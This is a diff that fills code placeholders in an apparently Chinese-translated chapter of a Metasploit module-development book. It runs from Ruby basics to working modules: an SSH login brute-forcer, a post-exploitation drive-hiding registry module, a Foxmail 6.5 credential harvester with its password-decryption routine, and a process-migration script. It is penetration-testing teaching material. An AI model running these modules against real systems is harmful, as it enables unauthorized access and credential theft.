@@ -46,21 +46,37 @@ Ruby 提供了一个交互式 shell，与之一起工作将帮助我们了解基
 
 让我们在 Ruby shell 中输入一些内容，看看会发生什么；假设我输入数字`2`，如下所示：
 
-[PRE0]
+```
+irb(main):001:0> 2
+=> 2   
+```
 
 shell 只是返回值。让我们再输入一些内容，比如带有加法运算符的内容，如下所示：
 
-[PRE1]
+```
+irb(main):002:0> 2+3
+=> 5  
+```
 
 我们可以看到，如果我们以表达式的形式输入数字，shell 会返回表达式的结果。
 
 让我们对字符串执行一些功能，例如将字符串的值存储在变量中，如下所示：
 
-[PRE2]
+```
+irb(main):005:0> a= "nipun"
+=> "nipun"
+irb(main):006:0> b= "loves Metasploit"
+=> "loves metasploit"  
+```
 
 在为变量`a`和`b`分配值之后，让我们看看当我们在控制台上输入`a`和`a+b`时会发生什么：
 
-[PRE3]
+```
+irb(main):014:0> a
+=> "nipun"
+irb(main):015:0> a+b
+=> "nipun loves metasploit"  
+```
 
 我们可以看到当我们输入`a`时，它反映了存储在名为`a`的变量中的值。同样，`a+b`给了我们连接的`a`和`b`。
 
@@ -68,23 +84,44 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 方法或函数是一组语句，当我们调用它时将执行。我们可以在 Ruby 的交互式 shell 中轻松声明方法，也可以使用脚本声明方法。在处理 Metasploit 模块时，了解方法是很重要的。让我们看看语法：
 
-[PRE4]
+```
+def method_name [( [arg [= default]]...[, * arg [, &expr ]])]
+expr
+end  
+```
 
 要定义一个方法，我们使用`def`后跟方法名，括号中包含参数和表达式。我们还使用`end`语句，跟随所有表达式以设置方法定义的结束。在这里，`arg`指的是方法接收的参数。此外，`expr`指的是方法接收或计算的表达式。让我们看一个例子：
 
-[PRE5]
+```
+irb(main):002:0> def xorops(a,b)
+irb(main):003:1> res = a ^ b
+irb(main):004:1> return res
+irb(main):005:1> end
+=> :xorops  
+```
 
 我们定义了一个名为`xorops`的方法，它接收名为`a`和`b`的两个参数。此外，我们对接收的参数进行了异或操作，并将结果存储在一个名为`res`的新变量中。最后，我们使用`return`语句返回结果：
 
-[PRE6]
+```
+irb(main):006:0> xorops(90,147)
+=> 201  
+```
 
 我们可以看到我们的函数通过执行异或操作打印出了正确的值。Ruby 提供了两种不同的函数来打印输出：`puts`和`print`。当涉及到 Metasploit 框架时，主要使用`print_line`函数。然而，可以使用`print_good`、`print_status`和`print_error`语句来表示成功、状态和错误。让我们看一些例子：
 
-[PRE7]
+```
+print_good("Example of Print Good") 
+print_status("Example of Print Status") 
+print_error("Example of Print Error") 
+```
 
 这些`print`方法在与 Metasploit 模块一起使用时，将产生以下输出：绿色的`+`符号表示良好，蓝色的`*`表示状态消息，红色的`-`表示错误：
 
-[PRE8]
+```
+[+] Example of Print Good
+[*] Example of Print Status
+[-] Example of Print Error  
+```
 
 我们将在本章的后半部分看到各种`print`语句类型的工作方式。
 
@@ -98,7 +135,12 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 建议使用双引号，因为如果使用单引号，可能会出现问题。让我们看看可能出现的问题：
 
-[PRE9]
+```
+irb(main):005:0> name = 'Msf Book'
+=> "Msf Book"
+irb(main):006:0> name = 'Msf's Book'
+irb(main):007:0' '  
+```
 
 我们可以看到当我们使用单引号时，它可以正常工作。然而，当我们尝试将`Msf's`替换为值`Msf`时，出现了错误。这是因为它将`Msf's`字符串中的单引号解释为单引号的结束，这并不是事实；这种情况导致了基于语法的错误。
 
@@ -106,7 +148,20 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 在处理 Metasploit 模块时，我们将需要字符串连接功能。我们将有多个实例需要将两个不同的结果连接成一个字符串。我们可以使用`+`运算符执行字符串连接。但是，我们可以使用`<<`运算符向变量附加数据来延长变量：
 
-[PRE10]
+```
+irb(main):007:0> a = "Nipun" 
+=> "Nipun" 
+irb(main):008:0> a << " loves" 
+=> "Nipun loves" 
+irb(main):009:0> a << " Metasploit" 
+=> "Nipun loves Metasploit" 
+irb(main):010:0> a
+=> "Nipun loves Metasploit" 
+irb(main):011:0> b = " and plays counter strike" 
+=> " and plays counter strike" 
+irb(main):012:0> a+b 
+=> "Nipun loves Metasploit and plays counter strike"  
+```
 
 我们可以看到，我们首先将值`"Nipun"`赋给变量`a`，然后使用`<<`运算符将`"loves"`和`"Metasploit"`附加到它上。我们可以看到我们使用了另一个变量`b`，并将值`"and plays counter strike"`存储在其中。接下来，我们简单地使用+运算符连接了这两个值，并得到了完整的输出`"Nipun loves Metasploit and plays counter strike"`。
 
@@ -114,13 +169,29 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 在 Ruby 中找到字符串的子字符串非常容易。我们只需要在字符串中指定起始索引和长度，如下例所示：
 
-[PRE11]
+```
+irb(main):001:0> a= "12345678"
+=> "12345678"
+irb(main):002:0> a[0,2]
+=> "12"
+irb(main):003:0> a[2,2]
+=> "34"  
+```
 
 # 拆分函数
 
 我们可以使用`split`函数将字符串的值拆分为变量数组。让我们看一个快速示例来演示这一点：
 
-[PRE12]
+```
+irb(main):001:0> a = "mastering,metasploit"
+=> "mastering,metasploit"
+irb(main):002:0> b = a.split(",")
+=> ["mastering", "metasploit"]
+irb(main):003:0> b[0]
+=> "mastering"
+irb(main):004:0> b[1]
+=> "metasploit"  
+```
 
 我们可以看到，我们已经将字符串的值从`","`位置拆分为一个新数组`b`。现在，包含值`"mastering"`和`"metasploit"`的`"mastering,metasploit"`字符串分别形成数组`b`的第 0 和第 1 个元素。
 
@@ -130,7 +201,28 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 让我们看一些快速示例及其输出：
 
-[PRE13]
+```
+irb(main):006:0> b="55"
+=> "55"
+irb(main):007:0> b+10
+TypeError: no implicit conversion of Fixnum into String
+        from (irb):7:in `+'
+        from (irb):7
+        from C:/Ruby200/bin/irb:12:in `<main>'
+irb(main):008:0> b.to_i+10
+=> 65
+irb(main):009:0> a=10
+=> 10
+irb(main):010:0> b="hello"
+=> "hello"
+irb(main):011:0> a+b
+TypeError: String can't be coerced into Fixnum
+        from (irb):11:in `+'
+        from (irb):11
+        from C:/Ruby200/bin/irb:12:in `<main>'
+irb(main):012:0> a.to_s+b
+=> "10hello"  
+```
 
 我们可以看到，当我们将`a`的值赋给带引号的`b`时，它被视为字符串，并且在执行加法操作时生成了错误。然而，一旦使用`to_i`函数，它将值从字符串转换为整数变量，并且加法操作成功执行。同样，关于字符串，当我们尝试将整数与字符串连接时，会出现错误。但是，在转换后，它可以正常工作。
 
@@ -142,7 +234,12 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 +   在 Ruby 中，使用内置的`hex`函数很容易将值从十六进制转换为十进制。让我们来看一个例子：
 
-[PRE14]
+```
+irb(main):021:0> a= "10"
+=> "10"
+irb(main):022:0> a.hex
+=> 16
+```
 
 +   +   我们可以看到，对于十六进制值`10`，我们得到了值`16`。
 
@@ -150,7 +247,10 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 +   前面函数的相反操作可以使用`to_s`函数执行，如下所示：
 
-[PRE15]
+```
+irb(main):028:0> 16.to_s(16)
+=> "10"
+```
 
 # Ruby 中的范围
 
@@ -158,7 +258,20 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 让我们定义一个范围，并查看我们可以对这种数据类型执行的各种操作：
 
-[PRE16]
+```
+irb(main):028:0> zero_to_nine= 0..9
+=> 0..9
+irb(main):031:0> zero_to_nine.include?(4)
+=> true
+irb(main):032:0> zero_to_nine.include?(11)
+=> false
+irb(main):002:0> zero_to_nine.each{|zero_to_nine| print(zero_to_nine)}
+0123456789=> 0..9
+irb(main):003:0> zero_to_nine.min
+=> 0
+irb(main):004:0> zero_to_nine.max
+=> 9
+```
 
 我们可以看到，范围提供了各种操作，如搜索、查找最小和最大值以及显示范围内的所有数据。在这里，`include?`函数检查值是否包含在范围内。此外，`min`和`max`函数显示范围内的最低和最高值。
 
@@ -166,7 +279,14 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 我们可以简单地将数组定义为各种值的列表。让我们看一个例子：
 
-[PRE17]
+```
+irb(main):005:0> name = ["nipun","metasploit"]
+=> ["nipun", "metasploit"]
+irb(main):006:0> name[0]
+=> "nipun"
+irb(main):007:0> name[1]
+=> "metasploit"  
+```
 
 到目前为止，我们已经涵盖了编写 Metasploit 模块所需的所有变量和数据类型。
 
@@ -180,7 +300,14 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 方法是函数的另一个名称。与 Ruby 不同背景的程序员可能会互换使用这些术语。方法是执行特定操作的子例程。使用方法实现代码的重用，并显著减少程序的长度。定义方法很容易，它们的定义以`def`关键字开始，并以`end`语句结束。让我们考虑一个简单的程序，以了解它们的工作原理，例如，打印出`50`的平方：
 
-[PRE18]
+```
+def print_data(par1) 
+square = par1*par1 
+return square 
+end 
+answer = print_data(50) 
+print(answer)  
+```
 
 `print_data`方法接收从主函数发送的参数，将其与自身相乘，并使用`return`语句发送回去。程序将这个返回值保存在一个名为`answer`的变量中，并打印这个值。在本章的后半部分以及接下来的几章中，我们将大量使用方法。
 
@@ -188,15 +315,35 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 决策也是一个简单的概念，与任何其他编程语言一样。让我们看一个例子：
 
-[PRE19]
+```
+irb(main):001:0> 1 > 2
+=> false  
+```
 
 让我们也考虑字符串数据的情况：
 
-[PRE20]
+```
+irb(main):005:0> "Nipun" == "nipun"
+=> false
+irb(main):006:0> "Nipun" == "Nipun"
+=> true  
+```
 
 让我们考虑一个带有决策运算符的简单程序：
 
-[PRE21]
+```
+def find_match(a) 
+if a =~ /Metasploit/ 
+return true 
+else 
+return false 
+end 
+end 
+# Main Starts Here 
+a = "1238924983Metasploitduidisdid" 
+bool_b=find_match(a) 
+print bool_b.to_s 
+```
 
 在上面的程序中，我们使用了单词`"Metasploit"`，它位于垃圾数据的中间，并赋值给变量`a`。接下来，我们将这些数据发送到`find_match()`方法，它匹配`/Metasploit/`正则表达式。如果变量`a`包含单词`"Metasploit"`，则返回 true 条件，否则将 false 值赋给变量`bool_b`。
 
@@ -204,19 +351,39 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 在 Windows 环境中执行上述程序的输出将与以下输出类似：
 
-[PRE22]
+```
+C:\Ruby23-x64\bin>ruby.exe a.rb
+true
+```
 
 # Ruby 中的循环
 
 迭代语句被称为循环；与任何其他编程语言一样，Ruby 编程中也存在循环。让我们使用它们，并看看它们的语法与其他语言有何不同：
 
-[PRE23]
+```
+def forl(a) 
+for i in 0..a 
+print("Number #{i}n") 
+end 
+end 
+forl(10) 
+```
 
 上面的代码从`0`到`10`迭代循环，如范围中定义的那样，并打印出值。在这里，我们使用`#{i}`在`print`语句中打印`i`变量的值。`n`关键字指定了一个新行。因此，每次打印一个变量，它都会占据一行新行。
 
 通过`each`循环迭代循环也是一种常见的做法，在 Metasploit 模块中被广泛使用。让我们看一个例子：
 
-[PRE24]
+```
+def each_example(a) 
+a.each do |i| 
+print i.to_s + "t" 
+end 
+end 
+# Main Starts Here 
+a = Array.new(5) 
+a=[10,20,30,40,50] 
+each_example(a) 
+```
 
 在上面的代码中，我们定义了一个接受数组`a`的方法，并使用`each`循环打印出所有的元素。使用`each`方法进行循环将把`a`数组的元素临时存储在`i`中，直到在下一个循环中被覆盖。`t`在`print`语句中表示一个制表符。
 
@@ -230,11 +397,33 @@ shell 只是返回值。让我们再输入一些内容，比如带有加法运�
 
 考虑一个情景，我们有一个变量`n`，值为`Hello world`，我们需要为它设计正则表达式。让我们看一下以下代码片段：
 
-[PRE25]
+```
+irb(main):001:0> n = "Hello world"
+=> "Hello world"
+irb(main):004:0> r = /world/
+=> /world/
+irb(main):005:0> r.match n
+=> #<MatchData "world">
+irb(main):006:0> n =~ r
+=> 6  
+```
 
 我们创建了另一个名为`r`的变量，并将我们的正则表达式存储在其中，即`/world/`。在下一行，我们使用`MatchData`类的`match`对象将正则表达式与字符串进行匹配。Shell 响应了一条消息，`MatchData "world"`，表示成功匹配。接下来，我们将使用另一种方法来使用`=~`运算符匹配字符串的方式，它返回匹配的确切位置。让我们看另一个做法：
 
-[PRE26]
+```
+irb(main):007:0> r = /^world/
+=> /^world/
+irb(main):008:0> n =~ r
+=> nil
+irb(main):009:0> r = /^Hello/
+=> /^Hello/
+irb(main):010:0> n =~ r
+=> 0
+irb(main):014:0> r= /world$/
+=> /world$/
+irb(main):015:0> n=~ r
+=> 6
+```
 
 让我们给`r`赋一个新值，即`/^world/`；这里，`^`运算符告诉解释器从开头匹配字符串。如果没有匹配，我们得到`nil`作为输出。我们修改这个表达式以从单词`Hello`开始；这次，它给我们返回位置`0`，表示匹配从最开始开始。接下来，我们将正则表达式修改为`/world$/`，表示我们需要从结尾匹配单词`world`，以便进行成功匹配。
 
@@ -342,7 +531,25 @@ Metasploit 模块是由不同库中包含的各种功能以及一般的 Ruby 编
 
 Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中看到通用的头部部分：
 
-[PRE27]
+```
+require 'msf/core' 
+
+class MetasploitModule < Msf::Auxiliary 
+  def initialize(info = {}) 
+    super(update_info(info, 
+      'Name'           => 'Module name', 
+      'Description'    => %q{ 
+        Say something that the user might want to know. 
+      }, 
+      'Author'         => [ 'Name' ], 
+      'License'        => MSF_LICENSE 
+    )) 
+  end 
+  def run 
+    # Main function 
+  end 
+end 
+```
 
 一个模块通过使用`require`关键字包含必要的库开始，前面的代码中跟随着`msf/core`库。因此，它包括了来自`/msf`目录的核心库。
 
@@ -356,7 +563,14 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 让我们系统地检查这个模块：
 
-[PRE28]
+```
+## 
+# This module requires Metasploit: https://metasploit.com/download 
+# Current source: https://github.com/rapid7/metasploit-framework 
+## 
+require 'rex/proto/http' 
+class MetasploitModule < Msf::Auxiliary 
+```
 
 让我们讨论这里的安排方式。以`#`符号开头的版权行是注释，包含在所有 Metasploit 模块中。`require 'rex/proto/http'`语句要求解释器包含来自`rex`库的所有 HTTP 协议方法的路径。因此，来自`/lib/rex/proto/http`目录的所有文件的路径现在对模块可用，如下面的屏幕截图所示：
 
@@ -366,7 +580,13 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 在下一行，`Msf::Auxiliary`将代码定义为辅助类型模块。让我们继续看代码，如下所示：
 
-[PRE29]
+```
+  # Exploit mixins should be called first 
+  include Msf::Exploit::Remote::HttpClient 
+  include Msf::Auxiliary::WmapScanServer 
+  # Scanner mixin should be near last 
+  include Msf::Auxiliary::Scanner 
+```
 
 前面的部分包括所有包含在模块中使用的方法的必要库文件。让我们列出这些包含的库的路径，如下所示：
 
@@ -378,11 +598,40 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 让我们看一下代码的下一部分：
 
-[PRE30]
+```
+def initialize 
+  super( 
+    'Name'        => 'HTTP Version Detection', 
+    'Description' => 'Display version information about each system', 
+    'Author'      => 'hdm', 
+    'License'     => MSF_LICENSE 
+  ) 
+
+  register_wmap_options({ 
+      'OrderID' => 0, 
+      'Require' => {}, 
+    }) 
+end 
+```
 
 这部分模块定义了`initialize`方法，该方法初始化了此模块的基本参数，如`Name`，`Author`，`Description`和`License`，并初始化了 WMAP 参数。现在，让我们看一下代码的最后一部分：
 
-[PRE31]
+```
+# Fingerprint a single host 
+  def run_host(ip) 
+    begin 
+      connect 
+      res = send_request_raw({ 'uri' => '/', 'method' => 'GET' }) 
+      fp = http_fingerprint(:response => res) 
+      print_good("#{ip}:#{rport} #{fp}") if fp 
+      report_service(:host => rhost, :port => rport, :sname => (ssl ? 'https' : 'http'), :info => fp) 
+    rescue ::Timeout::Error, ::Errno::EPIPE 
+    ensure 
+      disconnect 
+    end 
+  end 
+end 
+```
 
 这里的函数是扫描器的核心。
 
@@ -427,7 +676,25 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 让我们尝试构建一个简单的模块。我们将编写一个简单的 FTP 指纹模块，看看事情是如何工作的。让我们来检查 FTP 模块的代码：
 
-[PRE32]
+```
+class MetasploitModule < Msf::Auxiliary 
+  include Msf::Exploit::Remote::Ftp 
+  include Msf::Auxiliary::Scanner 
+  include Msf::Auxiliary::Report 
+  def initialize 
+    super( 
+      'Name'        => 'FTP Version Scanner Customized Module', 
+      'Description' => 'Detect FTP Version from the Target', 
+      'Author'      => 'Nipun Jaswal', 
+      'License'     =>  MSF_LICENSE 
+    ) 
+
+    register_options( 
+      [ 
+        Opt::RPORT(21), 
+      ]) 
+  end 
+```
 
 我们通过定义我们要构建的 Metasploit 模块的类型来开始我们的代码。在这种情况下，我们正在编写一个辅助模块，它与我们之前工作过的模块非常相似。接下来，我们定义了需要从核心库集中包含的库文件，如下所示：
 
@@ -439,7 +706,17 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 我们在`initialize`方法中定义模块的信息，如名称、描述、作者名称和许可证等属性。我们还定义了模块工作所需的选项。例如，在这里，我们将`RPORT`分配给端口`21`，这是 FTP 的默认端口。让我们继续处理模块的其余部分：
 
-[PRE33]
+```
+def run_host(target_host) 
+     connect(true, false) 
+    if(banner) 
+    print_status("#{rhost} is running #{banner}") 
+    report_service(:host => rhost, :port => rport, :name => "ftp", :info => banner) 
+    end 
+    disconnect 
+  end 
+end 
+```
 
 # 库和函数
 
@@ -485,7 +762,32 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 设计 SSH 服务的下一个身份验证测试模块，我们将看看在 Metasploit 中设计基于身份验证的检查有多容易，并执行攻击身份验证的测试。现在让我们跳入编码部分并开始设计一个模块，如下所示：
 
-[PRE34]
+```
+require 'metasploit/framework/credential_collection' 
+require 'metasploit/framework/login_scanner/ssh' 
+
+class MetasploitModule < Msf::Auxiliary 
+
+  include Msf::Auxiliary::Scanner 
+  include Msf::Auxiliary::Report 
+  include Msf::Auxiliary::AuthBrute 
+
+  def initialize 
+    super( 
+      'Name'        => 'SSH Scanner', 
+      'Description' => %q{ 
+        My Module. 
+      }, 
+      'Author'      => 'Nipun Jaswal', 
+      'License'     => MSF_LICENSE 
+    ) 
+
+    register_options( 
+      [ 
+        Opt::RPORT(22) 
+      ]) 
+  end 
+```
 
 在前面的示例中，我们已经看到了使用`Msf::Auxiliary::Scanner`和`Msf::Auxiliary::Report`的重要性。让我们看看其他包含的库并通过下表了解它们的用法：
 
@@ -497,7 +799,30 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 在`initialize`部分，我们为这个模块定义了基本信息。让我们看看下一部分：
 
-[PRE35]
+```
+def run_host(ip) 
+    cred_collection = Metasploit::Framework::CredentialCollection.new( 
+      blank_passwords: datastore['BLANK_PASSWORDS'], 
+      pass_file: datastore['PASS_FILE'], 
+      password: datastore['PASSWORD'], 
+      user_file: datastore['USER_FILE'], 
+      userpass_file: datastore['USERPASS_FILE'], 
+      username: datastore['USERNAME'], 
+      user_as_pass: datastore['USER_AS_PASS'], 
+    ) 
+
+    scanner = Metasploit::Framework::LoginScanner::SSH.new( 
+      host: ip, 
+      port: datastore['RPORT'], 
+      cred_details: cred_collection, 
+      proxies: datastore['Proxies'], 
+      stop_on_success: datastore['STOP_ON_SUCCESS'], 
+      bruteforce_speed: datastore['BRUTEFORCE_SPEED'], 
+      connection_timeout: datastore['SSH_TIMEOUT'], 
+      framework: framework, 
+      framework_module: self, 
+    ) 
+```
 
 我们可以看到在前面的代码中有两个对象，分别是`cred_collection`和`scanner`。这里需要注意的一个重要点是，我们不需要任何手动登录 SSH 服务的方法，因为登录扫描器会为我们完成一切。因此，`cred_collection`只是根据模块上设置的`datastore`选项生成凭据集。`CredentialCollection`类的美妙之处在于它可以一次性接受单个用户名/密码组合、单词列表和空凭据，或者它们中的一个。
 
@@ -515,7 +840,26 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 让我们看看我们如何实现这一点：
 
-[PRE36]
+```
+   scanner.scan! do |result| 
+      credential_data = result.to_h 
+      credential_data.merge!( 
+          module_fullname: self.fullname, 
+          workspace_id: myworkspace_id 
+      ) 
+         if result.success? 
+        credential_core = create_credential(credential_data) 
+        credential_data[:core] = credential_core 
+        create_credential_login(credential_data) 
+        print_good "#{ip} - LOGIN SUCCESSFUL: #{result.credential}" 
+         else 
+        invalidate_login(credential_data) 
+        print_status "#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})" 
+         end 
+   end 
+end 
+end 
+```
 
 可以观察到我们使用`.scan`来初始化扫描，这将自行执行所有的登录尝试，这意味着我们不需要明确指定任何其他机制。`.scan`指令就像 Ruby 中的`each`循环一样。
 
@@ -549,7 +893,24 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 因此，让我们从一个简单的驱动禁用模块开始，该模块将禁用目标系统上选择的驱动器，该系统是 Windows 7 操作系统。让我们看看模块的代码，如下所示：
 
-[PRE37]
+```
+require 'rex' 
+require 'msf/core/post/windows/registry' 
+class MetasploitModule < Msf::Post 
+  include Msf::Post::Windows::Registry 
+  def initialize 
+    super( 
+        'Name'          => 'Drive Disabler', 
+        'Description'   => 'This Modules Hides and Restrict Access to a Drive', 
+        'License'       => MSF_LICENSE, 
+        'Author'        => 'Nipun Jaswal' 
+      ) 
+    register_options( 
+      [ 
+        OptString.new('DriveName', [ true, 'Please SET the Drive Letter' ]) 
+      ]) 
+  end     
+```
 
 我们以与之前模块相同的方式开始。我们添加了所有需要的库的路径，以便在这个后渗透模块中使用。让我们看看下表中的任何新的包含和它们的用法：
 
@@ -569,7 +930,29 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 让我们看看模块的剩余部分：
 
-[PRE38]
+```
+def run 
+drive_int = drive_string(datastore['DriveName']) 
+key1="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" 
+
+exists = meterpreter_registry_key_exist?(key1) 
+if not exists 
+print_error("Key Doesn't Exist, Creating Key!") 
+registry_createkey(key1) 
+print_good("Hiding Drive") 
+meterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
+print_good("Restricting Access to the Drive") 
+meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
+else 
+print_good("Key Exist, Skipping and Creating Values") 
+print_good("Hiding Drive") 
+meterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
+print_good("Restricting Access to the Drive") 
+meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
+end 
+print_good("Disabled #{datastore['DriveName']} Drive") 
+end 
+```
 
 通常我们使用`run`方法来运行后渗透模块。因此，在定义`run`时，我们将`DriveName`变量发送到`drive_string`方法，以获取驱动器的数值。
 
@@ -583,7 +966,9 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 `meterpreter_registry_setvaldata`的示例可以分解如下：
 
-[PRE39]
+```
+meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
+```
 
 在前面的代码中，我们将路径设置为`key1`，将值设置为`NoViewOnDrives`，将驱动器`D`的十进制值设置为 16，将注册表的类型设置为`REG_DWORD`，并将视图设置为`REGISTRY_VIEW_NATIVE`，即 0。
 
@@ -597,7 +982,27 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 位掩码值为`16`用于禁用`E`驱动器。然而，在前面的模块中，我们在`drive_string`方法中使用`case`开关硬编码了一些值。让我们看看我们是如何做到的：
 
-[PRE40]
+```
+def drive_string(drive) 
+case drive 
+when "A" 
+return 1 
+
+when "B" 
+return 2 
+
+when "C" 
+return 4 
+
+when "D" 
+return 8 
+
+when "E" 
+return 16 
+end 
+end 
+end 
+```
 
 我们可以看到，前面的方法接受一个驱动器字母作为参数，并将其对应的数字返回给调用函数。让我们看看目标系统上有多少个驱动器：
 
@@ -631,7 +1036,26 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 在这个示例模块中，我们将攻击 Foxmail 6.5。我们将尝试解密凭据并将其存储在数据库中。让我们看看代码：
 
-[PRE41]
+```
+class MetasploitModule < Msf::Post 
+  include Msf::Post::Windows::Registry 
+  include Msf::Post::File 
+  include Msf::Auxiliary::Report 
+  include Msf::Post::Windows::UserProfiles 
+
+  def initialize(info={}) 
+    super(update_info(info, 
+      'Name'          => 'FoxMail 6.5 Credential Harvester', 
+      'Description'   => %q{ 
+This Module Finds and Decrypts Stored Foxmail 6.5 Credentials 
+      }, 
+      'License'       => MSF_LICENSE, 
+      'Author'        => ['Nipun Jaswal'], 
+      'Platform'      => [ 'win' ], 
+      'SessionTypes'  => [ 'meterpreter' ] 
+    )) 
+  end 
+```
 
 就像我们在前面的模块中看到的那样；我们首先包括所有必需的库，并提供有关模块的基本信息。
 
@@ -660,7 +1084,25 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 非常简单！让我们分析代码：
 
-[PRE42]
+```
+def run 
+  profile = grab_user_profiles() 
+  counter = 0 
+  data_entry = "" 
+  profile.each do |user| 
+  if user['LocalAppData'] 
+  full_path = user['LocalAppData'] 
+  full_path = full_path+"\VirtualStore\Program Files (x86)\Tencent\Foxmail\mail" 
+  if directory?(full_path) 
+  print_good("Fox Mail Installed, Enumerating Mail Accounts") 
+  session.fs.dir.foreach(full_path) do |dir_list| 
+  if dir_list =~ /@/ 
+  counter=counter+1 
+  full_path_mail = full_path+ "\" + dir_list + "\" + "Account.stg" 
+  if file?(full_path_mail) 
+  print_good("Reading Mail Account #{counter}") 
+  file_content = read_file(full_path_mail).split("n") 
+```
 
 在开始理解前面的代码之前，让我们看一下其中使用的重要函数，以便更好地了解其用法：
 
@@ -676,7 +1118,29 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 接下来，我们将路径连接到列出所有帐户的 `mail` 文件夹。我们使用 `directory?` 检查路径是否存在，并在成功时使用正则表达式匹配将包含 `@` 的目录名称复制到 `dir_list` 中。接下来，我们创建另一个名为 `full_path_mail` 的变量，并存储每封电子邮件的 `Account.stg` 文件的确切路径。我们确保使用 `file?` 来检查 `Account.stg` 文件是否存在。成功后，我们读取文件并在换行符处拆分所有内容。我们将拆分的内容存储到 `file_content` 列表中。让我们看代码的下一部分：
 
-[PRE43]
+```
+  file_content.each do |hash| 
+  if hash =~ /POP3Password/ 
+  hash_data = hash.split("=") 
+  hash_value = hash_data[1] 
+  if hash_value.nil? 
+  print_error("No Saved Password") 
+  else 
+  print_good("Decrypting Password for mail account: #{dir_list}")  
+  decrypted_pass = decrypt(hash_value,dir_list) 
+  data_entry << "Username:" +dir_list + "t" + "Password:" + decrypted_pass+"n" 
+  end 
+  end 
+  end 
+  end 
+  end 
+  end 
+  end 
+  end 
+  end 
+  store_loot("Foxmail Accounts","text/plain",session,data_entry,"Fox.txt","Fox Mail Accounts") 
+  end 
+```
 
 对于 `file_content` 中的每个条目，我们运行了一个检查，以查找常量 `POP3Password`。一旦找到，我们将常量在 `=` 处拆分，并将常量的值存储在一个名为 `hash_value` 的变量中。
 
@@ -684,7 +1148,38 @@ Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中
 
 让我们来了解解密函数，如下所示：
 
-[PRE44]
+```
+def decrypt(hash_real,dir_list) 
+  decoded = "" 
+  magic = Array[126, 100, 114, 97, 71, 111, 110, 126] 
+  fc0 = 90 
+  size = (hash_real.length)/2 - 1 
+  index = 0 
+  b = Array.new(size) 
+  for i in 0 .. size do 
+  b[i] = (hash_real[index,2]).hex  
+  index = index+2 
+  end 
+  b[0] = b[0] ^ fc0 
+  double_magic = magic+magic 
+  d = Array.new(b.length-1) 
+  for i in 1 .. b.length-1 do 
+  d[i-1] = b[i] ^ double_magic[i-1] 
+  end 
+  e = Array.new(d.length) 
+  for i in 0 .. d.length-1 
+  if (d[i] - b[i] < 0) 
+  e[i] = d[i] + 255 - b[i] 
+  else 
+  e[i] = d[i] - b[i] 
+  end 
+  decoded << e[i].chr 
+  end 
+  print_good("Found Username #{dir_list} with Password: #{decoded}") 
+  return decoded 
+  end 
+  end 
+```
 
 在前面的方法中，我们收到了两个参数，即哈希密码和用户名。`magic` 变量是解密密钥，存储在一个包含 `~draGon~` 字符串的十进制值的数组中，依次存储。我们将整数 `90` 存储为 `fc0`，稍后我们将详细讨论。
 
@@ -765,23 +1260,76 @@ API 调用是用于从 Windows DLL 文件中调用特定函数的 Windows 特定
 
 让我们看看以下代码：
 
-[PRE45]
+```
+#Admin Check 
+print_status("Checking If the Current User is Admin") 
+admin_check = is_admin? 
+if(admin_check) 
+print_good("Current User Is Admin") 
+else 
+print_error("Current User is Not Admin") 
+end 
+```
 
 我们只是检查前面的代码中当前用户是否是管理员。函数`is_admin`返回一个布尔值，基于此我们打印结果：
 
-[PRE46]
+```
+#User Group Check 
+user_check = is_in_admin_group? 
+if(user_check) 
+print_good("Current User is in the Admin Group") 
+else 
+print_error("Current User is Not in the Admin Group") 
+end 
+```
 
 在先前的代码中，我们检查用户是否属于管理员组。在逻辑上，前面的代码片段与先前的代码非常相似：
 
-[PRE47]
+```
+
+#Process Id Of the Explorer.exe Process 
+current_pid = session.sys.process.getpid 
+print_status("Current PID is #{current_pid}") 
+session.sys.process.get_processes().each do |x| 
+if x['name'].downcase == "explorer.exe" 
+print_good("Explorer.exe Process is Running with PID #{x['pid']}") 
+explorer_ppid = x['pid'].to_i 
+# Migration to Explorer.exe Process 
+session.core.migrate(explorer_ppid) 
